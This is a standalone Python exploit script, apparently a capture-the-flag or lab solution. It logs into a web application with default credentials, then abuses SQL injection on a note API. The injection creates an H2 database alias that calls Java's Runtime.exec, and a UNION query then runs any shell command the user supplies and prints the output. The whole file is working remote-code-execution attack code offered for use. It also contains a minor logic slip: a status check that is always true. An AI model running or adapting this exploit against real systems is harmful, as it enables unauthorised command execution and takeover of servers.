#!/usr/bin/env python3
import requests
import sys

def initCookie(url, username="user", password="123"):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        r = requests.post(url + "/login", data="username={}&password={}".format(username, password), headers=headers, allow_redirects=False)
    except requests.exceptions.RequestException as e:
        print("[-] Error:", e)
        return None
    return r.cookies.get("JSESSIONID")

def initCommand(url, cookie):
    if not cookie:
        print("[-] No cookie")
        return None
    payload = "SQL Injection';CREATE ALIAS execCmd AS 'String execCmd(String cmd) throws Exception { return new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\\\\\A\").next(); }'; -- -"
    data = {"name": (None, payload)}
    headers = {"Cookie": "JSESSIONID={}".format(cookie)}
    try:
        r = requests.post(url + "/api/note", files=data, headers=headers)
        if r.status_code == 500:
            print("[*] ALIAS execCmd has already been created.")
    except requests.exceptions.RequestException as e:
        print("[-] Error:", e)
        return None
    return r.status_code

def Main(url, command, cookie):
    if not cookie:
        print("[-] No cookie")
        return None


    if initCommand(url, cookie) == 200 or 500:
        payload = "' UNION SELECT 1, execCmd('{}'), 'abc'; -- -".format(command)
        data = {"name": (None, payload)}
        headers = {"Cookie": "JSESSIONID={}".format(cookie)}
        try:
            r = requests.post(url + "/api/note", files=data, headers=headers)
            print(r.json()[0]["Name"])
        except requests.exceptions.RequestException as e:
            print("[-] Error:", e)
            return None
        return

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage:", sys.argv[0], "<url> <command>")
        sys.exit(1)

    url = sys.argv[1]
    cmd = sys.argv[2]

    cookie = initCookie(url)
    Main(url, cmd, cookie)
